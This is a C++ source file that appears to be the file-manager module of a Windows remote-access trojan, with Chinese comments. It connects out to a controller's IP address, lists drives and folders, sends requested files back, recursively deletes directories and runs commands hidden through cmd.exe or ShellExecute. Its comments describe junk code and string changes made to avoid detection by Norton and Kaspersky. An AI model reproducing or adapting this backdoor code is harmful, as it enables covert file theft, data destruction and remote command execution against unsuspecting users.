#include <afx.h>
#include "StdAfx.h"
#include "FileOperator.h"
#include <stdio.h>
#include <shellapi.h>
#include "ConnectInfo.h"

///////////////////////////////////////////////////////////////////////////////
//
//  发送硬盘信息
//	GetLastError();//垃圾代码
//  GetTickCount();//垃圾代码
//	GetCurrentProcessId();//垃圾代码

//建立套接字与主控端交互发送 处理消息
DWORD MainFileManage()
{
	struct sockaddr_in LocalAddr;
	LocalAddr.sin_family=AF_INET;
	LocalAddr.sin_port = htons(ConnectInfo::getConnectInfo()->port);
	LocalAddr.sin_addr.S_un.S_addr= inet_addr(ConnectInfo::getConnectInfo()->ipAddress);

	SOCKET FileSocket = socket(AF_INET, SOCK_STREAM, 0);//重新建立一个专门的socket和客户端进行交互
	if(connect(FileSocket,(PSOCKADDR)&LocalAddr,sizeof(LocalAddr)) == SOCKET_ERROR)
	{

		closesocket(FileSocket);
		return 0;//connect error
	}

	//================================================================================
	MsgHead msgHead;
	char *chBuffer = new char[1536 * 1024]; //数据交换区 1.5MB

	//send socket type 
	msgHead.dwCmd = SOKCET_FILEMANAGE;
	msgHead.dwSize = 0;
	if(!SendMsg(FileSocket, chBuffer, &msgHead))
	{
		if(chBuffer != NULL)
			delete []chBuffer;

		closesocket(FileSocket);
		return 0;//send socket type error
	}
	bool flag = true;
	while(flag)
	{
		//接收命令
		if(!RecvMsg(FileSocket, chBuffer, &msgHead))
			break;

		//解析命令
		switch(msgHead.dwCmd)
		{
		case CMD_FILEDRIVER://获取驱动器
			{
				FileListDirver(chBuffer, &msgHead);
				if(!SendMsg(FileSocket, chBuffer, &msgHead))//MSGHEAD 为7
				{
					flag = false;
				}
			}
			break;
		case CMD_FILEDIRECTORY://列出某个盘所拥有的文件
			{
				FileListDirectory(chBuffer, &msgHead);
				if(!SendMsg(FileSocket, chBuffer, &msgHead))//MSGHEAD 为7
				{
					flag = false;
				}
			}
			break;
		case CMD_GETFILE://下载某个文件
			fileToServer(chBuffer, &msgHead, FileSocket);
			break;
		case CMD_FILE_DELETE:
			{
				deleteDirectory(chBuffer);
			}
			break;
		case CMD_FILE_EXECUTE:
			{
				FileExec(chBuffer, &msgHead);
			}
			break;
		default:
			{

			} 
			break;

		}
		memset(chBuffer, 0, 1536 * 1024);
	}
	if(chBuffer != NULL)
		delete[] chBuffer;
	closesocket(FileSocket);
	return 0;
}

void FileListDirver(char *pBuf, LPMsgHead lpMsgHead)
{
	typedef DWORD  (WINAPI *pSHGetFileInfoA)(
		LPCSTR pszPath, 
		DWORD dwFileAttributes, 
		SHFILEINFOA *psfi, 
		UINT cbFileInfo,
		UINT uFlags);
	typedef UINT (WINAPI *pGetDriveTypeA)(
		LPCSTR lpRootPathName);

	pSHGetFileInfoA MySHGetFileInfoA = NULL;
	pGetDriveTypeA MyGetDriveTypeA = NULL;

	HINSTANCE hShell32 = LoadLibrary("Shell32.dll");
	if(hShell32 != NULL)
	{
		MySHGetFileInfoA = (pSHGetFileInfoA)GetProcAddress(hShell32, "SHGetFileInfoA");
	}	
	HINSTANCE hKernel32 = LoadLibrary("Kernel32.dll");
	if(hKernel32 != NULL)
	{
		MyGetDriveTypeA = (pGetDriveTypeA)GetProcAddress(hKernel32, "GetDriveTypeA");
	}	

	DriverInfo driver;
	DWORD dwLen = 0;
	SHFILEINFO sfi;

	for (char chDriver = 'B'; chDriver <= 'Z'; chDriver++)
	{
		memset(&driver,0,sizeof(DriverInfo));
		sprintf(driver.driver, "%C:\\",chDriver);
		driver.drivertype = MyGetDriveTypeA(driver.driver);
		if (driver.drivertype >= 2)//如驱动器不能识别，则返回0。如指定的目录不存在，则返回1
		{
			if(MySHGetFileInfoA)
				MySHGetFileInfoA(driver.driver, 0, &sfi, sizeof(sfi), SHGFI_DISPLAYNAME);
			//else
			//	SHGetFileInfo(driver.driver, 0, &sfi, sizeof(sfi), SHGFI_DISPLAYNAME);
			strcpy(driver.display , sfi.szDisplayName);	

			//写入缓冲区
			memcpy(pBuf+dwLen,&driver,sizeof(DriverInfo));
			dwLen += sizeof(DriverInfo);
		}
	}

	if (hShell32)
		FreeLibrary(hShell32);
	if (hKernel32)
		FreeLibrary(hKernel32);

	lpMsgHead->dwCmd  = CMD_SUCCEED;
	lpMsgHead->dwSize = dwLen;
}



//枚举文件路径
void FileListDirectory(char *pBuf, LPMsgHead lpMsgHead)
{
	HANDLE hFile;
	WIN32_FIND_DATA WFD;

	SHFILEINFO shfi;
	SYSTEMTIME systime;
	FILETIME localtime;

	FileInfo m_FileInfo;
	DWORD dwLen = 0;

	//查找第一个文件
	pBuf[lpMsgHead->dwSize] = 0;
	if( ( hFile = FindFirstFile(pBuf,&WFD) ) == INVALID_HANDLE_VALUE)
	{   //文件夹不可读，目录无法访问
		lpMsgHead->dwCmd  = CMD_DIRFLODERERR;
		lpMsgHead->dwSize = 0;
		return;
	}

	do
	{
		//查完所有信息
		memset(&shfi,0,sizeof(shfi));
		SHGetFileInfo(WFD.cFileName, 
			FILE_ATTRIBUTE_NORMAL,
			&shfi, sizeof(shfi),
			SHGFI_ICON|SHGFI_USEFILEATTRIBUTES|SHGFI_TYPENAME );
		if(strcmp(WFD.cFileName,".")==0
			||strcmp(WFD.cFileName,"..")==0)
			continue;//是这些则跳过
		//写入文件信息结构
		memset(&m_FileInfo, 0, sizeof(FileInfo));
		strncpy(m_FileInfo.cFileName,WFD.cFileName,64);                              //文件名

		if(WFD.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)                     
		{
			m_FileInfo.iType = 1;                                                    //目录
			//strcpy(m_FileInfo.cAttrib, "文件夹");                                  //文件属性
		}
		else
		{
			m_FileInfo.iType = 2;                                                    //文件
			DWORD dwSize = WFD.nFileSizeHigh*MAXDWORD+WFD.nFileSizeLow;              //文件大小
			if(dwSize < 1024)//这个格式化的字符串被诺顿杀了，所以KB前2个空格
				sprintf(m_FileInfo.cSize,"%d Bytes", dwSize);
			else if (dwSize > 1024 && dwSize < 1024 * 1024)
				sprintf(m_FileInfo.cSize,"%4.2f  KB", (float)dwSize / 1024);
			else if(dwSize > 1024 * 1024 && dwSize < 1024 * 1024 * 1024)
				sprintf(m_FileInfo.cSize,"%4.2f MB", (float)dwSize / 1024 / 1024);
			else if(dwSize > 1024 * 1024 * 1024 && dwSize < 0xFFFFFFFF)
				sprintf(m_FileInfo.cSize,"%4.2f GB", (float)dwSize / 1024 / 1024 / 1024);
			else//被卡巴杀，只能这么搞了
				sprintf(m_FileInfo.cSize,"Kill You");
			strcpy(m_FileInfo.cAttrib, shfi.szTypeName);                            //文件属性
		}

		//转化格林时间到本地时间
		FileTimeToLocalFileTime(&WFD.ftLastWriteTime,&localtime);
		FileTimeToSystemTime(&localtime,&systime);
		sprintf(m_FileInfo.cTime, "%4d-%02d-%02d %02d:%02d:%02d",
			systime.wYear,systime.wMonth,systime.wDay,systime.wHour,
			systime.wMinute,systime.wSecond);                                            //文件时间

		//写入缓冲区
		memcpy(pBuf+dwLen,&m_FileInfo,sizeof(FileInfo));
		dwLen += sizeof(FileInfo);

		if(GetLastError()==ERROR_NO_MORE_FILES)
			break;
	}while(FindNextFile(hFile,&WFD));

	FindClose(hFile);

	lpMsgHead->dwCmd  = CMD_SUCCEED;
	lpMsgHead->dwSize = dwLen;
}


int fileToServer(char *pLocalPath, LPMsgHead lpMsgHead, SOCKET  FileSocket){
	CFile file;
	CFileException fileException;
	try
	{
		file.Open(pLocalPath, CFile::modeReadWrite, &fileException);
	}
	catch (CFileException* e)
	{
		file.Close();
	}	
	if(file == INVALID_HANDLE_VALUE) return 0;
	char* pFileData = new char[MAX_FILE_DATA_BUFFER_SIZE + 10];
	while(true){
		int readSize = file.Read(pFileData, MAX_FILE_DATA_BUFFER_SIZE);
		lpMsgHead->dwSize = readSize;
		SendMsg(FileSocket, pFileData, lpMsgHead);
		if(readSize < MAX_FILE_DATA_BUFFER_SIZE) break;
	}
	delete pFileData;
	file.Close();
	return 0;
}




void fileDelete(char *pBuf)
{
	DeleteFile(pBuf);
}

void deleteDirectory(CString directoryPath)   //删除一个文件夹下的所有内容
{   
	if(GetFileAttributes((LPSTR)(LPCSTR)directoryPath)   !=   FILE_ATTRIBUTE_DIRECTORY){
		fileDelete((LPSTR)(LPCSTR)directoryPath);
		return ;
	}
	CFileFind finder;
	CString path;
	path.Format("%s/*.*",directoryPath);
	BOOL bWorking = finder.FindFile(path);
	while(bWorking){
		bWorking = finder.FindNextFile();
		SetFileAttributes(finder.GetFilePath(),FILE_ATTRIBUTE_NORMAL); 
		if(finder.IsDirectory()&&!finder.IsDots()){//处理文件夹
			deleteDirectory(finder.GetFilePath()); //递归删除文件夹
			RemoveDirectory(finder.GetFilePath());
		}
		else{//处理文件
			fileDelete((LPSTR)(LPCSTR)finder.GetFilePath());
		}
	}
	RemoveDirectory(directoryPath);
	finder.Close();
}


void FileExec(char *pBuf, LPMsgHead lpMsgHead)
{
	//隐藏执行
	if(lpMsgHead->dwExtend1 != 0){
		HINSTANCE hInst = ::ShellExecute(NULL, "open",pBuf, NULL,NULL, SW_HIDE);
	}
	else {
		//正常执行
		char szCmd[512] = {0};
		wsprintf(szCmd, "cmd.exe /c \"%s\"", pBuf);
		PROCESS_INFORMATION ProcessInfo; 
		STARTUPINFOA StartupInfo; //This is an [in] parameter
		ZeroMemory(&StartupInfo, sizeof(StartupInfo));
		StartupInfo.cb          = sizeof(StartupInfo); //Only compulsory field
		StartupInfo.lpDesktop   = "WinSta0\\Default";
		StartupInfo.dwFlags     = STARTF_USESHOWWINDOW; 
		StartupInfo.wShowWindow = SW_SHOW;

		CreateProcess(NULL, szCmd, 
			NULL,NULL,FALSE,0,NULL,
			"c:\\",&StartupInfo,&ProcessInfo);
		CloseHandle(ProcessInfo.hThread);
		CloseHandle(ProcessInfo.hProcess);
	}
}

/*
void FilePaste(char *pBuf, LPMsgHead lpMsgHead)
{
FileOpt m_FileOpt;
memcpy(&m_FileOpt,pBuf,sizeof(m_FileOpt));

if(CopyFile(m_FileOpt.cScrFile,m_FileOpt.cDstFile,TRUE))
lpMsgHead->dwCmd  = CMD_SUCCEED;
else
lpMsgHead->dwCmd  = CMD_FAILED;
lpMsgHead->dwSize = 0;
}

void FileReName(char *pBuf, LPMsgHead lpMsgHead)
{
FileOpt m_FileOpt;
memcpy(&m_FileOpt,pBuf,sizeof(m_FileOpt));

if(MoveFile(m_FileOpt.cScrFile,m_FileOpt.cDstFile))
lpMsgHead->dwCmd  = CMD_SUCCEED;
else
lpMsgHead->dwCmd  = CMD_FAILED;
lpMsgHead->dwSize = 0;
}

*/